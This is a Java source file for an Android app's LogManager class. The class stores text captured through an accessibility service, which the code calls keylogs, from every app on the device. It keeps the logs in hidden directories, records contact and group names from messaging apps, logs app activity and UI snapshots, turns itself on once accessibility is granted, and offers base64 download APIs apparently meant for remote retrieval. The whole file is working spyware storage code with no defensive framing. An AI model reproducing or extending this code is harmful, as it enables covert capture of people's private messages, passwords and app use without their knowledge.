package com.task.tusker.commands;

import android.content.Context;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import com.task.tusker.services.UnifiedAccessibilityService;
import com.task.tusker.utils.Constants;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * LogManager — manages log storage and retrieval.
 *
 * Storage layout (hidden inside app's private internal directory):
 *   /data/data/<pkg>/files/.kl/YYYY-MM-DD.jsonl          — global logs for that day
 *   /data/data/<pkg>/files/.am/<appPkg>/kl/YYYY-MM-DD.jsonl — per-app logs (every app)
 *
 * Every log is written twice: once to the global day file and once to that
 * app's own day file. This is unconditional — it is not limited to the
 * packages listed in Constants.MONITORED_PACKAGES.
 *
 * Auto-started by UnifiedAccessibilityService when accessibility is granted.
 * This class is NOT an AccessibilityService itself — it is a utility
 * called from UnifiedAccessibilityService.
 */
public class LogManager {

    private static final String TAG = "LogManager";

    private static final long TWO_WEEKS_MS = 14L * 24L * 60L * 60L * 1000L;

    /** Interval between background durability syncs of the open log handles. */
    private static final long DIRTY_SYNC_INTERVAL_MS = 2_000L;

    /**
     * Upper bound on simultaneously open log files. Every app has its own day
     * file, so an unbounded map could exhaust the process file-descriptor
     * limit on a device with hundreds of apps installed. Least-recently-used
     * handles past this point are closed and transparently reopened.
     */
    private static final int MAX_OPEN_HANDLES = 48;

    /**
     * Newest UI snapshots retained per app. One file is written per window
     * change and the ss/ tree is outside the age-based purge, so without this
     * cap a long session on a monitored app would grow without limit.
     */
    private static final int MAX_SNAPSHOTS_PER_APP = 500;

    // SimpleDateFormat is neither cheap to build nor thread-safe. One instance
    // per thread per pattern removes the per-keystroke allocation cost.
    private static final ThreadLocal<SimpleDateFormat> FMT_DAY =
            ThreadLocal.withInitial(() -> new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()));
    private static final ThreadLocal<SimpleDateFormat> FMT_STAMP =
            ThreadLocal.withInitial(() -> new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()));
    private static final ThreadLocal<SimpleDateFormat> FMT_FILE =
            ThreadLocal.withInitial(() -> new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss-SSS", Locale.getDefault()));

    /** An open append handle for one day file, plus its unsynced byte count. */
    private static final class AppendHandle {
        final FileOutputStream out;
        int dirtyBytes;
        AppendHandle(FileOutputStream out) { this.out = out; }
    }

    private final Context context;
    private final File    klDir;
    private final File    activityDir;

    /** Open append handles by absolute path, written to on every single entry. */
    private final java.util.Map<String, AppendHandle> openHandles =
            new java.util.concurrent.ConcurrentHashMap<>();
    /** Insertion/usage order for {@link #MAX_OPEN_HANDLES} LRU eviction. */
    private final java.util.concurrent.ConcurrentLinkedQueue<String> handleOrder =
            new java.util.concurrent.ConcurrentLinkedQueue<>();

    private final java.util.concurrent.ScheduledExecutorService syncExecutor =
            java.util.concurrent.Executors.newSingleThreadScheduledExecutor(r -> {
                Thread t = new Thread(r, "LogSync");
                t.setDaemon(true);
                return t;
            });

    private volatile String cachedDay    = "";
    private volatile long   cachedDayMs  = 0L;

    private static volatile boolean enabled = false;

    public LogManager(Context context) {
        this.context = context.getApplicationContext();
        // Hidden dir inside app's private internal storage
        this.klDir = new File(context.getFilesDir(), Constants.LOG_DIR);
        if (!klDir.exists()) klDir.mkdirs();
        // Activity log dir
        this.activityDir = new File(context.getFilesDir(), ".activity");
        if (!activityDir.exists()) activityDir.mkdirs();

        // Auto-enable if accessibility service is already running (cross-process check)
        if (!enabled && isAccessibilityEnabled(context)) {
            enabled = true;
            Log.i(TAG, "LogManager AUTO-ENABLED (accessibility already granted)");
        }

        // Purge stale log files on every service start (runs on a background thread).
        new Thread(this::purgeOldLogs, "LogPurge").start();

        // Writes are handed to the OS immediately and flushed to disk on this
        // timer. Doing an fsync per keystroke instead would block the
        // accessibility worker for tens of milliseconds on every character.
        syncExecutor.scheduleWithFixedDelay(this::syncDirtyHandles,
                DIRTY_SYNC_INTERVAL_MS, DIRTY_SYNC_INTERVAL_MS,
                java.util.concurrent.TimeUnit.MILLISECONDS);
    }

    /**
     * Check if accessibility service is enabled (works across processes).
     * Uses both static instance check (same process) and heartbeat file (cross-process).
     */
    private static boolean isAccessibilityEnabled(Context context) {
        if (UnifiedAccessibilityService.getInstance() != null) {
            return true;
        }
        return UnifiedAccessibilityService.hasFreshHeartbeat(context);
    }

    /**
     * Delete any log (.jsonl) files that are older than 2 weeks.
     * Covers both the global directory and every per-app subdirectory.
     */
    private void purgeOldLogs() {
        long cutoff = System.currentTimeMillis() - TWO_WEEKS_MS;

        // 1. Global log directory
        deleteOldInDir(klDir, cutoff);

        // 2. Per-app log subdirectories  (.am/<pkg>/kl/)
        File amDir = new File(context.getFilesDir(), Constants.APP_MONITOR_DIR);
        if (amDir.exists()) {
            File[] appDirs = amDir.listFiles(File::isDirectory);
            if (appDirs != null) {
                for (File appDir : appDirs) {
                    File appKlDir = new File(appDir, "kl");
                    if (appKlDir.exists()) {
                        deleteOldInDir(appKlDir, cutoff);
                    }
                }
            }
        }
    }

    /** Delete all .jsonl files inside {@code dir} whose last-modified time is before {@code cutoff}. */
    private void deleteOldInDir(File dir, long cutoff) {
        File[] files = dir.listFiles(f -> f.getName().endsWith(".jsonl"));
        if (files == null) return;
        for (File f : files) {
            if (f.lastModified() < cutoff) {
                // Close first — writing to an unlinked inode would look like the
                // log silently stopped persisting.
                closeHandle(f.getAbsolutePath());
                if (f.delete()) {
                    Log.i(TAG, "Purged old log: " + f.getName());
                } else {
                    Log.w(TAG, "Failed to delete: " + f.getName());
                }
            }
        }
    }

    // ── Enable / disable ────────────────────────────────────────────────

    public static void setEnabled(boolean on) {
        enabled = on;
        Log.i(TAG, "LogManager " + (on ? "ENABLED" : "DISABLED"));
    }

    public static boolean isEnabled() {
        return enabled;
    }

    /**
     * Check if logging should proceed based on accessibility status.
     * Returns true if explicitly enabled OR if accessibility service is running.
     */
    private boolean shouldLog() {
        if (enabled) return true;
        // Auto-enable if accessibility is granted (cross-process check)
        if (isAccessibilityEnabled(context)) {
            enabled = true;
            Log.i(TAG, "LogManager AUTO-ENABLED via shouldLog()");
            return true;
        }
        return false;
    }

    // ── Write a log entry ────────────────────────────────────────────────

    /**
     * Called from UnifiedAccessibilityService for every text event.
     */
    public void logEntry(String packageName, String appName, String text, String eventType) {
        logEntry(packageName, appName, text, eventType, "");
    }

    /**
     * Called from UnifiedAccessibilityService for every text event, with screen/window title.
     * screenTitle is the contact/group name in messaging apps, empty string when unknown.
     */
    public void logEntry(String packageName, String appName, String text, String eventType,
                         String screenTitle) {
        if (!shouldLog() || text == null || text.isEmpty()) return;

        String today = todayStr();
        JSONObject entry = buildEntry(packageName, appName, text, eventType, screenTitle);
        String line = entry.toString() + "\n";

        // 1. Write to global day file
        appendToFile(globalFile(today), line);

        // 2. Write to per-app day file too — for EVERY app, not just monitored ones
        if (packageName != null && !packageName.isEmpty()) {
            appendToFile(appFile(packageName, today), line);
        }
    }

    // ── Activity Log APIs ────────────────────────────────────────────────

    /**
     * Record an app foreground event (recent activity).
     * Called from UnifiedAccessibilityService when an app comes to foreground.
     */
    public void logActivity(String packageName, String appName) {
        if (!shouldLog() || packageName == null || packageName.isEmpty()) return;

        String today = todayStr();
        JSONObject entry = buildActivityEntry(packageName, appName);
        String line = entry.toString() + "\n";

        appendToFile(activityFile(today), line);
    }

    /** Get recent activity entries (latest across all days). */
    public JSONObject getActivity(int limit) {
        JSONObject result = new JSONObject();
        JSONArray activities = new JSONArray();
        try {
            File[] files = activityDir.listFiles(f -> f.getName().endsWith(".jsonl"));
            List<String> lines = new ArrayList<>();
            if (files != null) {
                Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
                for (File f : files) {
                    List<String> fl = readLines(f);
                    Collections.reverse(fl);
                    lines.addAll(fl);
                    if (lines.size() >= limit) break;
                }
            }
            int count = Math.min(lines.size(), limit);
            for (int i = 0; i < count; i++) {
                try { activities.put(new JSONObject(lines.get(i))); } catch (Exception ignored) {}
            }
            result.put("success", true);
            result.put("activities", activities);
            result.put("count", activities.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Clear all activity logs. */
    public JSONObject clearActivity() {
        JSONObject result = new JSONObject();
        try {
            File[] files = activityDir.listFiles(f -> f.getName().endsWith(".jsonl"));
            int deleted = 0;
            if (files != null) {
                for (File f : files) {
                    closeHandle(f.getAbsolutePath());
                    if (f.delete()) deleted++;
                }
            }
            result.put("success", true);
            result.put("deletedFiles", deleted);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    // ── Read / list APIs ────────────────────────────────────────────────

    /** List all available log dates (global). */
    public JSONObject listLogFiles() {
        JSONObject result = new JSONObject();
        try {
            File[] files = klDir.listFiles(f -> f.getName().endsWith(".jsonl"));
            JSONArray dates = new JSONArray();
            if (files != null) {
                Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName())); // newest first
                for (File f : files) {
                    JSONObject info = new JSONObject();
                    String name = f.getName().replace(".jsonl", "");
                    info.put("date", name);
                    info.put("size", f.length());
                    info.put("filename", f.getName());
                    dates.put(info);
                }
            }
            result.put("success", true);
            result.put("files", dates);
            result.put("count", dates.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Download a specific day's global logs as base64 text. */
    public JSONObject downloadLogFile(String date) {
        JSONObject result = new JSONObject();
        try {
            File f = globalFile(date);
            if (!f.exists()) {
                result.put("success", false);
                result.put("error", "No log file for " + date);
                return result;
            }
            String raw = readFile(f);
            String b64 = Base64.encodeToString(raw.getBytes("UTF-8"), Base64.NO_WRAP);
            result.put("success", true);
            result.put("date", date);
            result.put("base64", b64);
            result.put("size", f.length());
            result.put("lineCount", raw.split("\n").length);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Get recent keylogs as JSON array (for live feed). */
    public JSONObject getKeylogs(int limit) {
        return getLogs(limit);
    }

    /** Clear all global keylogs. */
    public JSONObject clearKeylogs() {
        return clearLogs();
    }

    /** List all available keylog dates (global). */
    public JSONObject listKeylogFiles() {
        return listLogFiles();
    }

    /** Download a specific day's global keylogs as base64 text. */
    public JSONObject downloadKeylogFile(String date) {
        return downloadLogFile(date);
    }

    /** Get keylogs for a specific monitored app. */
    public JSONObject getAppKeylogs(String packageName, String date, int limit) {
        return getAppLogs(packageName, date, limit);
    }

    /** List keylog file dates for an app. */
    public JSONObject listAppKeylogFiles(String packageName) {
        return listAppLogFiles(packageName);
    }

    /** Download a specific day's app keylog as base64. */
    public JSONObject downloadAppKeylogFile(String packageName, String date) {
        return downloadAppLogFile(packageName, date);
    }

    /** Get recent global logs (latest entries across all days). */
    public JSONObject getLogs(int limit) {
        JSONObject result = new JSONObject();
        JSONArray logs = new JSONArray();
        try {
            File[] files = klDir.listFiles(f -> f.getName().endsWith(".jsonl"));
            List<String> lines = new ArrayList<>();
            if (files != null) {
                Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
                for (File f : files) {
                    List<String> fl = readLines(f);
                    Collections.reverse(fl);
                    lines.addAll(fl);
                    if (lines.size() >= limit) break;
                }
            }
            int count = Math.min(lines.size(), limit);
            for (int i = 0; i < count; i++) {
                try { logs.put(new JSONObject(lines.get(i))); } catch (Exception ignored) {}
            }
            result.put("success", true);
            result.put("logs", logs);
            result.put("count", logs.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Clear all global logs. */
    public JSONObject clearLogs() {
        JSONObject result = new JSONObject();
        try {
            File[] files = klDir.listFiles(f -> f.getName().endsWith(".jsonl"));
            int deleted = 0;
            if (files != null) {
                for (File f : files) {
                    closeHandle(f.getAbsolutePath());
                    if (f.delete()) deleted++;
                }
            }
            result.put("success", true);
            result.put("deletedFiles", deleted);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    // ── App Monitor APIs ─────────────────────────────────────────────────

    /** List all monitored apps that have data stored. */
    public JSONObject listMonitoredApps() {
        JSONObject result = new JSONObject();
        try {
            File amDir = new File(context.getFilesDir(), Constants.APP_MONITOR_DIR);
            JSONArray apps = new JSONArray();
            if (amDir.exists()) {
                File[] appDirs = amDir.listFiles(File::isDirectory);
                if (appDirs != null) {
                    for (File d : appDirs) {
                        JSONObject info = new JSONObject();
                        info.put("packageName", d.getName());
                        info.put("monitored", isMonitored(d.getName()));
                        // Count log files
                        File klSubDir = new File(d, "kl");
                        File[] kls = klSubDir.exists() ? klSubDir.listFiles(f -> f.getName().endsWith(".jsonl")) : null;
                        info.put("logDays", kls != null ? kls.length : 0);
                        // Count screenshot files
                        File ssDir = new File(d, "ss");
                        File[] sss = ssDir.exists() ? ssDir.listFiles(f -> f.getName().endsWith(".jpg")) : null;
                        info.put("screenshots", sss != null ? sss.length : 0);
                        apps.put(info);
                    }
                }
            }
            result.put("success", true);
            result.put("apps", apps);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Get logs for a specific monitored app. */
    public JSONObject getAppLogs(String packageName, String date, int limit) {
        JSONObject result = new JSONObject();
        try {
            File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                                safeDirName(packageName) + "/kl");
            JSONArray logs = new JSONArray();

            if (date != null && !date.isEmpty()) {
                // Specific day
                File f = new File(dir, date + ".jsonl");
                if (f.exists()) {
                    List<String> lines = readLines(f);
                    for (String l : lines) {
                        try { logs.put(new JSONObject(l)); } catch (Exception ignored) {}
                    }
                }
            } else {
                // Latest entries across all days
                File[] files = dir.exists() ? dir.listFiles(f -> f.getName().endsWith(".jsonl")) : null;
                List<String> lines = new ArrayList<>();
                if (files != null) {
                    Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
                    for (File f : files) {
                        List<String> fl = readLines(f);
                        Collections.reverse(fl);
                        lines.addAll(fl);
                        if (lines.size() >= limit) break;
                    }
                }
                int count = Math.min(lines.size(), limit);
                for (int i = 0; i < count; i++) {
                    try { logs.put(new JSONObject(lines.get(i))); } catch (Exception ignored) {}
                }
            }
            result.put("success", true);
            result.put("packageName", packageName);
            result.put("logs", logs);
            result.put("count", logs.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** List log file dates for an app. */
    public JSONObject listAppLogFiles(String packageName) {
        JSONObject result = new JSONObject();
        try {
            File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                                safeDirName(packageName) + "/kl");
            JSONArray dates = new JSONArray();
            if (dir.exists()) {
                File[] files = dir.listFiles(f -> f.getName().endsWith(".jsonl"));
                if (files != null) {
                    Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
                    for (File f : files) {
                        JSONObject info = new JSONObject();
                        info.put("date", f.getName().replace(".jsonl", ""));
                        info.put("size", f.length());
                        dates.put(info);
                    }
                }
            }
            result.put("success", true);
            result.put("files", dates);
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /** Download a specific day's app log as base64. */
    public JSONObject downloadAppLogFile(String packageName, String date) {
        JSONObject result = new JSONObject();
        try {
            File f = appFile(packageName, date);
            if (!f.exists()) {
                result.put("success", false);
                result.put("error", "No log for " + packageName + " on " + date);
                return result;
            }
            String raw = readFile(f);
            result.put("success", true);
            result.put("packageName", packageName);
            result.put("date", date);
            result.put("base64", Base64.encodeToString(raw.getBytes("UTF-8"), Base64.NO_WRAP));
            result.put("size", f.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    // ── Screenshot storage for AppMonitor ────────────────────────────────

    /**
     * Store an accessibility-tree snapshot (compact JSON text) for a monitored app.
     * Files are saved as {timestamp}.json inside the app's private ss/ directory.
     * Called from AppMonitor.onAccessibilitySnapshot().
     *
     * <p>One file is written per window change, so the directory is trimmed to
     * {@link #MAX_SNAPSHOTS_PER_APP} newest on every save. Without a cap the
     * ss/ tree would grow without limit — it is not covered by the age-based
     * purge, which only sweeps the log directories.
     */
    public void saveAppSnapshot(String packageName, String snapshotJson) {
        try {
            File ssDir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                                  safeDirName(packageName) + "/ss");
            if (!ssDir.exists()) ssDir.mkdirs();
            String ts = FMT_FILE.get().format(new Date());
            File f = new File(ssDir, ts + ".json");
            FileWriter fw = new FileWriter(f);
            fw.write(snapshotJson);
            fw.close();
            trimSnapshots(ssDir);
        } catch (Exception e) {
            Log.e(TAG, "saveAppSnapshot: " + e.getMessage());
        }
    }

    /**
     * Delete the oldest snapshots in {@code ssDir} until at most
     * {@link #MAX_SNAPSHOTS_PER_APP} remain. Filenames are timestamp-prefixed,
     * so a lexicographic sort is chronological.
     */
    private void trimSnapshots(File ssDir) {
        File[] files = ssDir.listFiles(f -> f.getName().endsWith(".json"));
        if (files == null || files.length <= MAX_SNAPSHOTS_PER_APP) return;
        Arrays.sort(files, (a, b) -> a.getName().compareTo(b.getName()));
        int excess = files.length - MAX_SNAPSHOTS_PER_APP;
        for (int i = 0; i < excess; i++) {
            if (!files[i].delete()) {
                Log.w(TAG, "trimSnapshots: could not delete " + files[i].getName());
            }
        }
        Log.i(TAG, "trimSnapshots: removed " + excess + " old snapshot(s) for " + ssDir.getName());
    }

    /**
     * List accessibility-tree snapshots for a monitored app.
     * Snapshots are small JSON text files; no image data.
     */
    public JSONObject listAppScreenshots(String packageName) {
        JSONObject result = new JSONObject();
        try {
            File ssDir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                                  safeDirName(packageName) + "/ss");
            JSONArray list = new JSONArray();
            if (ssDir.exists()) {
                File[] files = ssDir.listFiles(f -> f.getName().endsWith(".json"));
                if (files != null) {
                    Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
                    for (File f : files) {
                        JSONObject info = new JSONObject();
                        info.put("filename", f.getName());
                        info.put("timestamp", f.getName().replace(".json", "").replace("_", " "));
                        info.put("size", f.length());
                        list.put(info);
                    }
                }
            }
            result.put("success", true);
            result.put("packageName", packageName);
            result.put("screenshots", list);
            result.put("count", list.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    /**
     * Return the content of a specific accessibility snapshot file.
     * The JSON snapshot is returned directly (not base64-encoded) since it is plain text.
     */
    public JSONObject downloadAppScreenshot(String packageName, String filename) {
        JSONObject result = new JSONObject();
        try {
            File f = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                              safeDirName(packageName) + "/ss/" + new File(filename).getName());
            if (!f.exists()) {
                result.put("success", false);
                result.put("error", "Snapshot not found: " + filename);
                return result;
            }
            // Read the JSON text directly — no base64 needed, snapshots are small text files
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(new FileReader(f));
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            br.close();
            result.put("success", true);
            result.put("packageName", packageName);
            result.put("filename", filename);
            result.put("snapshot", new JSONObject(sb.toString().trim()));
            result.put("size", f.length());
        } catch (Exception e) {
            safeError(result, e);
        }
        return result;
    }

    // ── Helpers ──────────────────────────────────────────────────────────

    private JSONObject buildEntry(String pkg, String appName, String text, String type) {
        return buildEntry(pkg, appName, text, type, "");
    }

    private JSONObject buildEntry(String pkg, String appName, String text, String type,
                                  String screenTitle) {
        JSONObject o = new JSONObject();
        try {
            o.put("timestamp", FMT_STAMP.get().format(new Date()));
            o.put("packageName", pkg);
            o.put("appName", appName != null ? appName : pkg);
            o.put("text", text);
            o.put("eventType", type);
            if (screenTitle != null && !screenTitle.isEmpty()) {
                o.put("screenTitle", screenTitle);
            }
        } catch (JSONException ignored) {}
        return o;
    }

    private File globalFile(String date) {
        return new File(klDir, date + ".jsonl");
    }

    private File appFile(String packageName, String date) {
        File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                            safeDirName(packageName) + "/kl");
        if (!dir.exists()) dir.mkdirs();
        return new File(dir, date + ".jsonl");
    }

    /**
     * Every app now gets its own directory, so the package name is used as a
     * path segment. Strip anything that could escape the .am root.
     */
    private String safeDirName(String packageName) {
        if (packageName == null) return "unknown";
        String name = packageName.replaceAll("[^A-Za-z0-9._]", "_");
        return name.isEmpty() ? "unknown" : name;
    }

    private String todayStr() {
        long now = System.currentTimeMillis();
        // Re-formatting the date costs far more than the clock read, and the
        // value only changes at midnight — so refresh it at most once a second.
        if (cachedDay != null && now - cachedDayMs < 1000L) return cachedDay;
        String d = FMT_DAY.get().format(new Date(now));
        cachedDay   = d;
        cachedDayMs = now;
        return d;
    }

    private boolean isMonitored(String pkg) {
        for (String p : Constants.MONITORED_PACKAGES) {
            if (p.equals(pkg)) return true;
        }
        return false;
    }

    private JSONObject buildActivityEntry(String pkg, String appName) {
        JSONObject o = new JSONObject();
        try {
            o.put("timestamp", FMT_STAMP.get().format(new Date()));
            o.put("packageName", pkg);
            o.put("appName", appName != null ? appName : pkg);
        } catch (JSONException ignored) {}
        return o;
    }

    private File activityFile(String date) {
        return new File(activityDir, date + ".jsonl");
    }

    /**
     * Append one already-formatted line to a day file.
     *
     * The handle is kept open between calls: reopening the file and running an
     * fsync for every character is what made capture feel laggy. The bytes go
     * to the OS on this call and are made durable by {@link #syncDirtyHandles()}
     * a moment later.
     */
    private void appendToFile(File f, String line) {
        if (f == null || line == null) return;
        String path = f.getAbsolutePath();
        AppendHandle h = openHandles.get(path);
        if (h == null) {
            h = openAppendHandle(f);
            if (h == null) return;
        }
        byte[] data;
        try {
            data = line.getBytes("UTF-8");
        } catch (Exception e) {
            return;
        }
        synchronized (h) {
            try {
                h.out.write(data);
                h.dirtyBytes += data.length;
            } catch (IOException e) {
                Log.e(TAG, "appendToFile: " + e.getMessage());
                closeHandle(path);
            }
        }
    }

    /** Open (or reuse) an append handle for {@code f}, evicting the oldest if needed. */
    private AppendHandle openAppendHandle(File f) {
        File parent = f.getParentFile();
        if (parent != null && !parent.exists()) parent.mkdirs();
        try {
            AppendHandle h = new AppendHandle(new FileOutputStream(f, true));
            AppendHandle prev = openHandles.put(f.getAbsolutePath(), h);
            if (prev != null) {
                // Race with a concurrent opener — keep the first one.
                closeQuietly(prev);
                return prev;
            }
            handleOrder.add(f.getAbsolutePath());
            evictExcessHandles();
            return h;
        } catch (IOException e) {
            Log.e(TAG, "openAppendHandle: " + e.getMessage());
            return null;
        }
    }

    /** Keep the descriptor count bounded by closing the oldest unused handles. */
    private void evictExcessHandles() {
        while (openHandles.size() > MAX_OPEN_HANDLES) {
            String oldest = handleOrder.poll();
            if (oldest == null) return;
            closeHandle(oldest);
        }
    }

    private void closeHandle(String path) {
        AppendHandle h = openHandles.remove(path);
        if (h != null) {
            closeQuietly(h);
        }
        handleOrder.remove(path);
    }

    private void closeQuietly(AppendHandle h) {
        synchronized (h) {
            try { h.out.close(); } catch (IOException ignored) {}
            h.dirtyBytes = 0;
        }
    }

    /** Close every open handle — call before deleting files underneath them. */
    private void closeAllHandles() {
        for (String path : new ArrayList<>(openHandles.keySet())) {
            closeHandle(path);
        }
        handleOrder.clear();
    }

    /**
     * Push everything currently buffered by the OS down to storage. Runs on the
     * {@code LogSync} thread every couple of seconds and is also exposed so the
     * keylogger service can force a flush on demand.
     */
    public void syncDirtyHandles() {
        for (java.util.Map.Entry<String, AppendHandle> e : openHandles.entrySet()) {
            AppendHandle h = e.getValue();
            synchronized (h) {
                if (h.dirtyBytes == 0) continue;
                try {
                    h.out.flush();
                    h.out.getFD().sync();
                    h.dirtyBytes = 0;
                } catch (IOException ex) {
                    Log.e(TAG, "syncDirtyHandles: " + ex.getMessage());
                    closeHandle(e.getKey());
                }
            }
        }
    }

    /** Number of day files with bytes written but not yet synced to storage. */
    public int pendingSyncCount() {
        int n = 0;
        for (AppendHandle h : openHandles.values()) {
            synchronized (h) {
                if (h.dirtyBytes > 0) n++;
            }
        }
        return n;
    }

    /** Flush and close every handle — called when the manager is torn down. */
    public void shutdown() {
        syncDirtyHandles();
        closeAllHandles();
        syncExecutor.shutdownNow();
    }

    private String readFile(File f) throws IOException {
        BufferedReader br = new BufferedReader(new FileReader(f));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line).append("\n");
        br.close();
        return sb.toString();
    }

    private byte[] readFileBytes(File f) throws IOException {
        byte[] data = new byte[(int) f.length()];
        java.io.FileInputStream fis = new java.io.FileInputStream(f);
        fis.read(data);
        fis.close();
        return data;
    }

    private List<String> readLines(File f) {
        List<String> result = new ArrayList<>();
        try {
            BufferedReader br = new BufferedReader(new FileReader(f));
            String line;
            while ((line = br.readLine()) != null) {
                if (!line.trim().isEmpty()) result.add(line);
            }
            br.close();
        } catch (IOException e) {
            Log.e(TAG, "readLines: " + e.getMessage());
        }
        return result;
    }

    private void safeError(JSONObject result, Exception e) {
        try {
            result.put("success", false);
            result.put("error", e.getMessage());
        } catch (JSONException ignored) {}
    }
}
